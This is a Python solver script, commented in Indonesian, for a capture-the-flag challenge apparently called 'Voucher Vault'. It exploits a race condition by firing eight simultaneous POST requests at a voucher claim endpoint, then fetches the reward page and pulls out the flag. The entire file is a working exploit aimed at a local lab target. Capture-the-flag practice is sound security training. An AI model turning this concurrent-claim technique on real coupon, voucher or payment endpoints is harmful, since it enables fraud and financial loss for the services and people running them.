#!/usr/bin/env python3
"""Solver untuk challenge Voucher Vault (client-side race condition)."""

import concurrent.futures
import re
import sys
import time
from urllib.error import HTTPError, URLError
from urllib.request import Request, urlopen


BASE_URL = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8900"
PARALLEL_REQUESTS = 8


def fetch(path: str, method: str = "GET") -> str:
    request = Request(
        f"{BASE_URL.rstrip('/')}{path}",
        method=method,
        headers={"User-Agent": "VoucherVault-CTF-Solver/1.0"},
    )
    for attempt in range(3):
        try:
            with urlopen(request, timeout=10) as response:
                return response.read().decode("utf-8", errors="replace")
        except (ConnectionResetError, TimeoutError):
            if attempt == 2:
                raise
            time.sleep(0.3)

    raise RuntimeError("Permintaan gagal setelah beberapa percobaan.")


def claim_once(_: int) -> bool:
    try:
        return '"ok":true' in fetch("/api/claim", method="POST")
    except (HTTPError, URLError, OSError):
        return False


def main() -> int:
    try:
        fetch("/api/status")
    except HTTPError as error:
        if error.code == 404:
            print(
                "Endpoint challenge belum tersedia. Jalankan `docker compose up --build -d` "
                "agar container memakai versi race condition.",
                file=sys.stderr,
            )
        else:
            print(f"Gagal mengakses target: {error}", file=sys.stderr)
        return 1
    except (URLError, OSError) as error:
        print(f"Gagal mengakses target: {error}", file=sys.stderr)
        return 1

    try:
        with concurrent.futures.ThreadPoolExecutor(max_workers=PARALLEL_REQUESTS) as pool:
            results = list(pool.map(claim_once, range(PARALLEL_REQUESTS)))
        print(f"Klaim paralel berhasil: {sum(results)}/{PARALLEL_REQUESTS}")
        reward = fetch("/reward")
    except (HTTPError, URLError, OSError) as error:
        print(f"Gagal mengakses target: {error}", file=sys.stderr)
        return 1

    # Mendukung format flag yang dikustomisasi oleh penyelenggara, misalnya
    # CTF{...} atau CODEX26{...}.
    flag = re.search(r"[A-Za-z][A-Za-z0-9_]*\{[^}\r\n]+\}", reward)
    if not flag:
        print("Flag tidak ditemukan. Reset challenge lalu jalankan solver lagi.", file=sys.stderr)
        return 1

    print(flag.group(0))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
